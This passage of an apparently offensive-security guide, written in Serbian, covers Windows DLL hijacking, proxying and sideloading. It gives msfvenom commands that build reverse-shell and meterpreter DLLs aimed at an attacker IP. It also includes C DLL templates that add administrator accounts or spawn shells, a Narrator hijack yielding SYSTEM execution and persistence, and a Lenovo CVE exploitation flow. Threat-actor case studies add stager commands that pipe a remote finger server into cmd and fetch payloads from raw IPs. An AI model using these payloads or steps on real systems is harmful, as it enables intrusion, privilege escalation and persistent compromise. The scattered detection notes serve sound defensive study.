U suštini, **DLL proxy** je DLL koji može da **izvrši vaš zlonamerni kod prilikom učitavanja**, ali i da **izlaže funkcije** i **radi** onako kako se **očekuje**, tako što **prosleđuje sve pozive pravoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete da **navedete izvršnu datoteku i izaberete biblioteku** koju želite da proxify-ujete, pa da **generišete proxified dll**, ili da **navedete DLL** i **generišete proxified dll**.

### **Meterpreter**

**Nabavite reverse shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Nabavite meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Kreirajte korisnika (x86, nisam video x64 verziju):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Sopstveni

U mnogim slučajevima, DLL koji kompajlirate mora da **eksportuje svaku funkciju koju uvozi proces žrtve**. Ako nedostaje neki neophodan export, binarna datoteka ne može da ga razreši i exploit ne uspeva.

<details>
<summary>C šablon za DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL primer za kreiranje korisnika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (pristupačnost/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivu DLL datoteku za lokalizaciju, specifičnu za jezik, koja se može oteti za izvršavanje proizvoljnog koda i postojanost.<sup>[[7]](#references)</sup>

Ključne činjenice
- Putanja koja se proverava (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Zastarela putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako se na OneCore putanji nalazi DLL kojim upravlja napadač i koji može da se upisuje, ona se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Eksporti nisu neophodni.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` или `CreateFile`.
- Pokrenite Narrator i uočite pokušaj učitavanja navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC tišina
- Naivni hijack će oglasiti/highlightovati UI. Da biste ostali neprimetni, prilikom attach-a enumerišite Narrator threads, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte je pomoću `SuspendThread`; nastavite rad u sopstvenoj niti. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Okidanje i persistence putem Accessibility konfiguracije
- Kontekst korisnika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Uz navedeno, pokretanjem Narrator-a učitava se postavljeni DLL. Na secure desktop-u (ekranu za prijavu), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.

SYSTEM izvršavanje pokrenuto preko RDP-a (lateralno kretanje)
- Dozvolite klasični RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se sa hostom putem RDP-a; na ekranu za prijavu pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje se zaustavlja kada se RDP sesija zatvori — odmah izvršite inject/migrate.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni unos registra Accessibility Tool (AT) (npr. CursorIndicator), izmeniti ga tako da pokazuje na proizvoljni binary/DLL, uvesti ga, a zatim postaviti `configuration` na ime tog AT-a. Ovo omogućava proxy izvršavanje proizvoljnog koda kroz Accessibility framework.

Napomene
- Za pisanje u `%windir%\System32` i promenu HKLM vrednosti potrebna su admin prava.
- Sva payload logika može biti smeštena u `DLL_PROCESS_ATTACH`; exports nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Eskalacija privilegija pomoću TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu-u (`TPQMAssistant.exe`), praćen kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe`, nalazi se u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` pokreće se svakog dana u 9:30 AM u kontekstu prijavljenog korisnika.
- **Dozvole direktorijuma**: `CREATOR OWNER` ima dozvolu pisanja, što lokalnim korisnicima omogućava da postave proizvoljne fajlove.
- **DLL Search ponašanje**: Program prvo pokušava da učita `hostfxr.dll` iz svog radnog direktorijuma i beleži "NAME NOT FOUND" ako nedostaje, što ukazuje na to da pretraga lokalnog direktorijuma ima prednost.

### Implementacija exploita

Napadač može da postavi zlonamerni `hostfxr.dll` stub u isti direktorijum i iskoristi nedostajući DLL za izvršavanje koda u kontekstu korisnika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Tok napada

1. Kao standardni korisnik, smestite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL se pokreće u administratorskoj sesiji sa srednjim nivoom integriteta.
4. Kombinujte standardne UAC bypass tehnike da biste podigli privilegije sa srednjeg nivoa integriteta na SYSTEM.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading preko potpisanog Host-a (wsc_proxy.exe)

Akteri pretnji često kombinuju MSI-based dropper-e sa DLL side-loading-om kako bi izvršili payload-e pod pouzdanim, potpisanim procesom.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se neprimetno pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija) i rekonstruiše sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer para: wsc_proxy.exe potpisan od strane Avast-a + wsc.dll pod kontrolom napadača).
- Kada se potpisani EXE pokrene, redosled pretrage Windows DLL-ova prvo učitava wsc.dll iz radnog direktorijuma, čime se izvršava kod napadača pod potpisanim nadređenim procesom (ATT&CK T1574.001).

MSI analiza (šta tražiti)
- Tabela CustomAction:
  - Potražite unose koji pokreću izvršne datoteke ili VBScript. Primer sumnjivog obrasca: LaunchApplication pokreće ugrađenu datoteku u pozadini.
  - U Orca (Microsoft Orca.exe) pregledajte tabele CustomAction, InstallExecuteSequence i Binary.
- Ugrađeni/podeljeni payload-i u MSI CAB-u:
  - Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ili koristite lessmsi: lessmsi x package.msi C:\out
  - Potražite više malih delova koje VBScript CustomAction spaja i dešifruje. Uobičajeni tok:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktični sideloading pomoću wsc_proxy.exe
- Stavite ove dve datoteke u istu fasciklu:
  - wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
  - wsc.dll: DLL napadača. Ako nisu potrebni određeni exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports pravoj biblioteci, a payload pokrenite u DllMain.
- Napravite minimalni DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Za zahteve izvoza koristite proxying framework (npr. DLLirant/Spartacus) da biste generisali forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje naziva DLL-a od strane host binarne datoteke. Ako host koristi apsolutne putanje ili bezbedne zastavice za učitavanje (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijacking možda neće uspeti.
- KnownDLLs, SxS i prosleđeni izvozi mogu uticati na redosled prioriteta i moraju se uzeti u obzir pri izboru host binarne datoteke i skupa izvoza.

## Potpisani trojci + šifrovani payloadi (studija slučaja ShadowPad)

Check Point je opisao kako Ink Dragon postavlja ShadowPad koristeći **trojku od tri fajla** kako bi se uklopio u legitimni softver, a istovremeno zadržao osnovni payload šifrovan na disku:<sup>[[12]](#references)</sup>

1. **Potpisani host EXE** – zloupotrebljavaju se dobavljači kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršnu datoteku tako da liči na Windows binarnu datoteku (na primer `conhost.exe`), ali Authenticode potpis ostaje važeći.
2. **Zlonamerni loader DLL** – smešta se pored EXE-a pod očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binarna datoteka zamaskirana pomoću ScatterBrain framework-a; jedini zadatak joj je da pronađe šifrovani blob, dešifruje ga i reflektivno mapira ShadowPad.
3. **Šifrovani payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon mapiranja dešifrovanog payload-a u memoriju, loader briše TMP fajl da bi uništio forenzičke dokaze.

Napomene o tradecraft-u:

* Preimenovanje potpisanog EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE zaglavlju) omogućava mu da se predstavlja kao Windows binarna datoteka, a da zadrži potpis dobavljača, zato oponašajte naviku Ink Dragon-a da postavlja binarne datoteke koje liče na `conhost.exe`, a zapravo su AMD/NVIDIA uslužni programi.
* Pošto izvršna datoteka ostaje pouzdana, za većinu kontrola dozvoljenih aplikacija dovoljno je da vaš zlonamerni DLL bude smešten pored nje. Usredsredite se na prilagođavanje loader DLL-a; potpisani nadređeni proces obično može da se pokrene bez izmena.
* ShadowPad-ov decryptor očekuje da TMP blob bude smešten pored loader-a i da može da se upisuje kako bi mogao da nulira fajl nakon mapiranja. Ostavite direktorijum upisivim dok se payload ne učita; kada se nađe u memoriji, TMP fajl može bezbedno da se obriše radi OPSEC-a.

### LOLBAS stager + lanac sideloading-a arhive u fazama (finger → tar/curl → WMI)

Operateri kombinuju DLL sideloading sa LOLBAS-om tako da je jedini prilagođeni артефакт на диску злонамерни DLL поред поузданог EXE-а:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell покреће `cmd.exe /c`, преузима команде са Finger сервера и прослеђује их у `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` preuzima tekst preko TCP/79; `| cmd` izvršava odgovor servera, omogućavajući operatorima da rotiraju drugi stepen na strani servera.

- **Ugrađeno preuzimanje/raspakivanje:** Preuzmite arhivu sa bezazlenom ekstenzijom, raspakujte je i postavite metu za sideload i DLL u nasumičnu fasciklu `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` skriva prikaz napretka i prati preusmeravanja; `tar -xf` koristi Windows-ov ugrađeni tar.

- **Pokretanje preko WMI/CIM:** Pokrenite EXE preko WMI-ja kako bi telemetrija prikazala proces koji je kreirao CIM dok učitava DLL koji se nalazi u istom direktorijumu:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Radi sa binarnim fajlovima koji daju prednost lokalnim DLL-ovima (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) pokreće se pod pouzdanim imenom.

- **Detekcija:** Postavite upozorenje za `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; ova kombinacija je neuobičajena izvan administratorskih skripti.


## Studija slučaja: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

U nedavnom upadu grupe Lotus Blossom zloupotrebljen je pouzdan lanac ažuriranja za isporuku NSIS droppera koji je postavio DLL sideload i payload-e koji se izvršavaju u potpunosti u memoriji.<sup>[[13]](#references)</sup>

Tok napada
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, ispušta preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, zlonamerni `log.dll` i šifrovani blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE uvozi `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` učitava blob pomoću mmap-a; `LogWrite` ga dešifruje prilagođenim stream cipher-om zasnovanim na LCG-u (konstante **0x19660D** / **0x3C6EF35F**, ključni materijal izveden iz prethodnog hash-a), prepisuje bafer plaintext shellcode-om, oslobađa privremene podatke i skače na njega.
- Da bi izbegao IAT, loader razrešava API-je heširanjem izvoznih imena pomoću **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi ih sa hash vrednostima ciljeva sa dodatkom salt-a.

Glavni shellcode (Chrysalis)
- Dešifruje glavni modul nalik PE-u ponavljanjem operacija add/XOR/sub sa ključem `gQ2JR&9;` u pet prolaza, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da bi dovršio razrešavanje importa.
- Rekonstruiše stringove sa imenima DLL-ova tokom izvršavanja pomoću transformacija bit-rotate/XOR za svaki karakter, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku izvoznu tabelu u blokovima od 4 bajta uz Murmur-style mixing i koristi `GetProcAddress` samo ako hash nije pronađen.

Ugrađena konfiguracija i C2
- Konfiguracija se nalazi unutar ispuštene datoteke `BluetoothService` na **offset 0x30808** (veličina **0x980**) i dešifruje se pomoću RC4 ključa `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beacons formiraju profil hosta razdvojen tačkama, dodaju na početak tag `4Q`, a zatim ga šifruju RC4 ključem `vAuig34%^325hGV` pre poziva `HttpSendRequestA` preko HTTPS-a. Odgovori se dešifruju pomoću RC4 i prosleđuju na obradu preko tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + slučajevi prenosa u blokovima).
- Režim izvršavanja zavisi od CLI argumenata: bez argumenata = instalira persistence (service/Run key) koji upućuje na `-i`; `-i` ponovo pokreće sam sebe sa `-k`; `-k` preskače instalaciju i pokreće payload.

Primećen alternativni loader
- Isti upad je ispuštao Tiny C Compiler i izvršavao `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, uz `libtcc.dll` pored njega. C izvorni kod koji je dostavio napadač sadržao je shellcode, koji je kompajliran i pokrenut u memoriji bez upisivanja PE-a na disk. Primer implementacije:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ova faza prevođenja i pokretanja zasnovana na TCC-u uvezla je `Wininet.dll` tokom izvršavanja i preuzela shellcode druge faze sa hardkodiranog URL-a, čime je obezbedila fleksibilan loader koji se predstavlja kao pokretanje kompajlera.

## Sideloading potpisanog hosta uz export proxying + parkiranje niti hosta

Neki lanci DLL sideloading-a dodaju **inženjering stabilnosti** kako bi legitimni host ostao aktivan dovoljno dugo da se naredne faze ispravno učitaju, umesto da se sruši nakon učitavanja zlonamernog DLL-a.<sup>[[11]](#references)</sup>

Uočeni obrazac
- Postavite pouzdani EXE pored zlonamernog DLL-a, koristeći očekivani naziv zavisnosti, kao što je `version.dll`.
- Zlonamerni DLL **prosleđuje svaki očekivani export** nazad stvarnom sistemskom DLL-u (na primer, `%SystemRoot%\\System32\\version.dll`), tako da razrešavanje importa i dalje uspeva, a proces hosta nastavlja da radi.
- Nakon učitavanja, zlonamerni DLL **zakrpi ulaznu tačku hosta** tako da glavna nit uđe u beskonačnu `Sleep` petlju, umesto da se završi ili pokrene putanje koda koje bi prekinule proces.
- Nova nit obavlja stvarni zlonamerni posao: dešifruje naziv ili putanju DLL-a sledeće faze (česti su RC4/XOR), a zatim ga pokreće pomoću `LoadLibrary`.

Zašto je ovo važno
- Uobičajeni DLL proxying čuva kompatibilnost API-ja, ali ne garantuje da će host ostati aktivan dovoljno dugo za naredne faze.
- Parkiranje glavne niti pomoću `Sleep(INFINITE)` jednostavan je način da potpisani proces ostane u memoriji dok loader obavlja dešifrovanje, pripremu faze ili mrežno pokretanje u pomoćnoj niti.
- Lov samo na sumnjivi `DllMain` propušta ovaj obrazac ako se zanimljivo ponašanje odvija nakon zakrpe ulazne tačke hosta i pokretanja sekundarne niti.

Minimalni postupak
1. Kopirajte potpisani host EXE i utvrdite koji DLL učitava iz lokalnog direktorijuma.
2. Napravite proxy DLL koji exportuje iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirajte pomoćnu nit.
4. Iz te niti zakrpite ulaznu tačku hosta ili početnu rutinu glavne niti tako da ulazi u petlju koja poziva `Sleep`.
5. Dešifrujte naziv DLL-a/konfiguraciju sledeće faze i pozovite `LoadLibrary` ili ručno mapirajte payload.

Odbrambeni pokazatelji
- Potpisani procesi koji učitavaju `version.dll` ili slične uobičajene biblioteke iz sopstvenog direktorijuma aplikacije umesto iz `System32`.
- Zakrpe memorije na ulaznoj tački procesa ubrzo nakon učitavanja slike, naročito skokovi/pozivi preusmereni na `Sleep`/`SleepEx`.
- Niti koje kreira proxy DLL, a koje odmah pozivaju `LoadLibrary` za drugi DLL sa dešifrovanim nazivom.
- Proxy DLL-ovi sa svim export-ima postavljeni pored izvršnih datoteka dobavljača, unutar direktorijuma za pripremu sa dozvolom za upis, kao što su `ProgramData`, `%TEMP%` ili putanje raspakovanih arhiva.

## References

- [1] [Red Canary – Uvidi u obaveštajne podatke: januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Eskalacija privilegija pomoću TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking u Windows-u. Jednostavan primer u C-u.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore koristi novi malware za napade na Evropu](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hakovanje pristupačnosti: kada se DLL hijack susretne sa Windows pomoćnim alatkama](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitalni dvojnici: analiza evoluirajućih kampanja lažnog predstavljanja koje distribuiraju Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zajednički interesi: analiza grupa pretnji koje ciljaju vladu jedne države jugoistočne Azije](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relejne mreže i unutrašnjeg rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: detaljna analiza Lotus Blossom-ovog skupa alata](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack lanac](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Praćenje špijunskih kampanja iranske APT grupe Screening Serpens iz 2026. godine](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Brzo i žestoko: operacije Nimbus Manticore-a tokom iranskog sukoba](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Radnje zadataka](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cilja vlade i kritičnu infrastrukturu jugoistočne Azije](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Otkrivanje varijante SectopRAT-a ugrađene u legitimni softver](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
